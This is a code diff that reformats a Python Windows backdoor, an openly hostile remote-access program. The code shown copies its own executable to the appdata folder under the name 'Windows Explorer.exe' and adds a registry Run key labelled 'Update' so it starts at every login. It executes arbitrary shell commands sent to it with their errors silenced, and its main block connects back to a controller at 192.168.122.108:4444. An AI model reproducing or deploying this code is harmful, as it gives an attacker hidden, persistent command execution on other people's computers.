@@ -19,7 +19,12 @@ class Backdoor:
         evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
         if not os.path.exists(evil_file_location):
             shutil.copyfile(sys.executable, evil_file_location)
-            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
+            subprocess.call(
+                'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d "'
+                + evil_file_location
+                + '"',
+                shell=True,
+            )
 
     def reliable_send(self, data):
         # Serialisation
@@ -36,7 +41,9 @@ class Backdoor:
                 continue
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+        return subprocess.check_output(
+            command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
+        )
 
     def change_working_directory_to(self, path):
         os.chdir(path)
@@ -78,6 +85,7 @@ class Backdoor:
 
 # Main
 if __name__ == "__main__":
+    # noinspection PyBroadException
     try:
         my_backdoor = Backdoor("192.168.122.108", 4444)
         my_backdoor.run()
